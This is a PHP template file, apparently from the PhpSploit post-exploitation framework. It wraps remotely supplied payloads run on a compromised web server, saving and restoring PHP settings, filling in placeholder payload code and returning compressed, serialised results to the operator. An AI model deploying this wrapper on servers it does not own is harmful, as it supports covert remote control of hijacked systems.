<?php

// backup php configuration state for later restoration.
$orig_conf = ini_get_all();
foreach ($orig_conf as $key => $val)
{
    if ($val["access"] & 1)
        $orig_conf[$key] = $val["local_value"];
    else
        unset($orig_conf[$key]);
}

// %%PAYLOAD%% is replaced by $PAYLOAD_PREFIX configuration setting.
// This feature allows executing something in php each time the
// payload is executed, because any sent request is encapsulated
// through this file.
%%PAYLOAD_PREFIX%%

// container for dynamic input variables, transmitted from plugins
// at python side (plugin.py files).
$PHPSPLOIT = array();

// allows php-side plugins to use `return error("something")`
// with a printf()-like flavour.
// This is the correct way to inform the framework that output
// is an error message.
function error($a='', $b=False, $c=False, $d=False, $e=False)
{
    return (array('__ERROR__' => sprintf($a, $b, $c, $d, $e)));
}

// %%PAYLOAD%% is replaced by the dynamically built payload
// before each remote plugin execution.
function payload()
{
    %%PAYLOAD%%
}

// handle payload result and output it's gzipped content.
$result = payload();
if (@array_keys($result) !== array('__ERROR__'))
    $result = array('__RESULT__' => $result);
echo gzcompress(serialize($result));

// restore backed php configuration state.
foreach ($orig_conf as $key => $val)
    @ini_set($key, $val);

?>
